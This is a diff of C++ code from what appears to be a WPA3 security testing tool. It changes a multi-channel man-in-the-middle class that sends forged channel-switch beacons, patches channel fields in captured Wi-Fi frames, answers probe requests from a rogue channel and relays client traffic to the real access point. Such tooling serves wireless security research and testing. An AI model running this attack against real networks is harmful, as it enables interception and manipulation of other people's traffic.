@@ -20,10 +20,10 @@ namespace wpa3_tester{
                    string  nic_rogue,
                    string  ssid,
                    string  client_mac)
-        : nic_real_ap(move(nic_real)),
-          nic_rogue_ap(move(nic_rogue)),
-          ssid(move(ssid)),
-          client_mac(move(client_mac))
+        : nic_real_ap(std::move(nic_real)),
+          nic_rogue_ap(std::move(nic_rogue)),
+          ssid(std::move(ssid)),
+          client_mac(std::move(client_mac))
     {}
 
     McMitm::~McMitm() { stop(); }
@@ -36,7 +36,6 @@ namespace wpa3_tester{
         const auto it = clients.find(mac);
         return (it != clients.end()) ? it->second.get() : nullptr;
     }
-
 
     void McMitm::send_disas(const string& macaddr) const {
         Dot11Disassoc pkt;
@@ -59,15 +58,6 @@ namespace wpa3_tester{
     void McMitm::run(const int timeout_sec) {
         probe_resp.reset(beacon_to_probe_resp(*beacon, netconfig.rogue_channel));
 
-        //FIXME this should be optimalization, how it should works?
-        /*Dot11Deauthentication deauth;
-        deauth.addr1(HWAddress<6>("ff:ff:ff:ff:ff:ff"));
-        deauth.addr2(HWAddress<6>(ap_mac));
-        deauth.addr3(HWAddress<6>(ap_mac));
-        deauth.reason_code(3);
-        RadioTap radio = RadioTap() / deauth;
-        sender_real->send(radio, nic_real_mon);*/
-
         if (!sniffer_real || !sniffer_rogue) {
             log(LogLevel::ERROR, "Sniffers not initialized before run()");
             return;
@@ -78,9 +68,6 @@ namespace wpa3_tester{
         }
 
         CSA_attack::send_CSA_beacon(ap_mac, nic_real_ap, ssid, netconfig.real_channel, netconfig.rogue_channel, 1);
-
-       // CSA_attack::send_CSA_beacon(ap_mac, nic_real_mon, ssid,
-       //                             netconfig.real_channel, netconfig.rogue_channel);
 
         last_real_beacon  = now_sec();
         last_rogue_beacon = now_sec();
@@ -103,17 +90,12 @@ namespace wpa3_tester{
             try_sniff(*sniffer_real,  &McMitm::handle_rx_real_chan);
             try_sniff(*sniffer_rogue, &McMitm::handle_rx_rogue_chan);
 
-            /*while (!disas_queue.empty() && disas_queue.top().first <= now_sec()) {
-                string mac = disas_queue.top().second;
-                disas_queue.pop();
-                send_disas(mac);
-            }*/
-
             if (next_beacon <= now_sec()) {
                 CSA_attack::send_CSA_beacon(ap_mac, nic_real_ap, ssid, netconfig.real_channel,  netconfig.rogue_channel, 1);
                 next_beacon += 0.10;
             }
 
+            // print
             if (last_real_beacon + 2.0 < now_sec()) {
                 log(LogLevel::WARNING, "Didn't receive beacon from real AP for two seconds");
                 last_real_beacon = now_sec();
@@ -162,11 +144,6 @@ namespace wpa3_tester{
             effective_size -= 4; // get off FCS
         }
 
-        // 2. Patch RadioTap - frekvence (libtins vyřeší offsety za tebe)
-        //FIXME radiohead dont change channel
-        //constexpr uint16_t channel_flags = RadioTap::OFDM | RadioTap::TWO_GZ;
-        //rt.channel(hw_capabilities::channel_to_freq(channel), channel_flags);
-
         const vector<uint8_t> rt_patched = rt.serialize();
         const uint16_t old_rt_len = raw[2] | (raw[3] << 8);
 
@@ -187,8 +164,6 @@ namespace wpa3_tester{
             }
             // Patching logic
             if (id == Dot11::DS_SET && len == 1) {
-                cerr << "Patching DS from " << static_cast<int>(raw[pos+2])
-         << " to " << static_cast<int>(channel) << " at pos " << pos << endl;
                 raw[pos + 2] = channel; // DS Parameter
             } else if (id == Dot11::HT_OPERATION && len >= 1) {
                 raw[pos + 2] = channel; // HT Operation
@@ -208,7 +183,8 @@ namespace wpa3_tester{
 
         const string addr1 = dot11->addr1().to_string();
         string addr2;
-        if (const auto* mgmt = pdu.find_pdu<Dot11ManagementFrame>())
+        const auto* mgmt = pdu.find_pdu<Dot11ManagementFrame>();
+        if (mgmt)
             addr2 = mgmt->addr2().to_string();
         else if (const auto* data = pdu.find_pdu<Dot11Data>())
             addr2 = data->addr2().to_string();
@@ -220,36 +196,51 @@ namespace wpa3_tester{
                 CSA_attack::send_CSA_beacon(ap_mac, nic_real_ap, ssid,
                                             netconfig.real_channel, netconfig.rogue_channel, 1);
             }
-            print_rx(LogLevel::DEBUG, "Real channel", *dot11);
+            //print_rx(LogLevel::DEBUG, "Real channel", *dot11);
             return; // don't forward client→AP frames from real channel, they belong on rogue
+        }
+
+        if (dot11->subtype() == Dot11::BEACON) {
+            last_real_beacon = now_sec();
+            if (mgmt) {
+                for (const auto& opt : mgmt->options()) {
+                    log(LogLevel::DEBUG, "Beacon tag id=%d", opt.option());
+                }
+                if (mgmt->search_option(Dot11::CHANNEL_SWITCH)) {
+                    log(LogLevel::DEBUG, "Skipping CSA beacon");
+                    return;
+                }
+            }
         }
 
         // Frames from real AP — forward to rogue channel with patched channel IE
         if (addr2 == ap_mac) {
-            if (dot11->subtype() == Dot11::BEACON)
+            if (dot11->subtype() == Dot11::BEACON){
                 last_real_beacon = now_sec();
+            }
 
             // Serialize, patch raw bytes, resend
             auto raw = pdu.serialize();
+
+            const uint16_t rt_lend = raw[2] | (raw[3] << 8);
+            const RadioTap& rt_check = pdu.rfind_pdu<RadioTap>();
+            assert(rt_lend == rt_check.header_size());
+
             patch_channel_raw(raw, netconfig.rogue_channel);
 
             const uint16_t rt_len = *reinterpret_cast<const uint16_t*>(raw.data() + 2);
             RawPDU dot11_only(raw.data() + rt_len, raw.size() - rt_len);
 
-            /*RadioTap rt;
-            rt.inner_pdu(dot11_only);
-            sender_rogue->send(rt, nic_rogue_ap);*/
-
             auto patched = RawPDU(raw.data(), raw.size());
             sender_rogue->send(patched, nic_rogue_ap);
-            print_rx(LogLevel::INFO, "Real channel", *dot11, " -- MitM");
-            return;
+            //print_rx(LogLevel::INFO, "Real channel", *dot11, " -- MitM");
         }
     }
 
     void McMitm::handle_rx_rogue_chan(PDU& pdu) {
-        auto* dot11 = pdu.find_pdu<Dot11>();
+        const auto* dot11 = pdu.find_pdu<Dot11>();
         if (!dot11) return;
+
 
         const string addr1 = dot11->addr1().to_string();
         string addr2;
@@ -265,11 +256,36 @@ namespace wpa3_tester{
             return;
         }
 
+        if (dot11->subtype() == Dot11::PROBE_REQ) {
+            if (probe_resp) {
+                probe_resp->addr1(addr2);
+
+                try { // send to get auth
+                    const auto raw = pdu.serialize();
+                    RawPDU raw_pdu(raw.data(), raw.size());
+                    sender_real->send(raw_pdu, nic_real_ap);
+                } catch (const socket_write_error& e) {
+                    log(LogLevel::WARNING, "send failed (subtype=%d): %s", dot11->subtype(), e.what());
+                }
+
+                RadioTap rt;
+                rt.inner_pdu(probe_resp->clone());
+                sender_rogue->send(rt);
+
+                log(LogLevel::INFO, "Replied ProbeResp to %s", addr2.c_str());
+            }
+            return;
+        }
+
         // Frames from client -> AP
         if (addr1 == ap_mac) {
-            print_rx(LogLevel::INFO, "Rogue channel", *dot11, " -- MitM'ing");
-            sender_real->send(*dot11, nic_real_ap);
-            return;
+            try {
+                const auto raw = pdu.serialize();
+                RawPDU raw_pdu(raw.data(), raw.size());
+                sender_real->send(raw_pdu, nic_real_ap);
+            } catch (const socket_write_error& e) {
+                log(LogLevel::WARNING, "send failed (subtype=%d): %s", dot11->subtype(), e.what());
+            }
         }
     }
 
@@ -316,8 +332,7 @@ namespace wpa3_tester{
         } else if (const auto* data = pkt.find_pdu<Dot11Data>()) {
             addr2 = data->addr2().to_string();
         }
-        string msg = prefix + ": " +addr2 + " -> " +
-                     pkt.addr1().to_string() + ": " + frame_to_str(pkt);
+        string msg = prefix+": "+addr2+" -> "+pkt.addr1().to_string()+": "+frame_to_str(pkt);
         if (!suffix.empty()) msg += suffix;
         log(level, msg);
     }
